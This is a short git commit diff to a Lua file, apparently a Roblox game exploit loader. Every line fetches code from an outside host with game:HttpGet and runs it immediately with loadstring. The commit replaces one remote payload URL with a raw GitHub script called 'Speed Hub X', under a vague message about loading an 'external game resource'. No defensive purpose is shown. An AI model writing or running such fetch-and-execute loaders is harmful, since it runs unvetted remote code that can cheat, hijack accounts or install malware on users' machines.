702f9cf30896fb5e7bde9317805a26d1ea7eb6e0
scriptgag2 <daffagantengd82@gmail.com>
2026-06-16 19:36:13 +0700

    Add script to load external game resource

--- Script.lua
+++ Script.lua
@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImMwOGUzZDliLTgxZjMtNGVjYi05NTBlLTZjZmIyNTk3ZDllYiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImMwOGUzZDliLTgxZjMtNGVjYi05NTBlLTZjZmIyNTk3ZDllYiIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6ImdhZzJfbWFpbl92aXN1YWwifX0"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
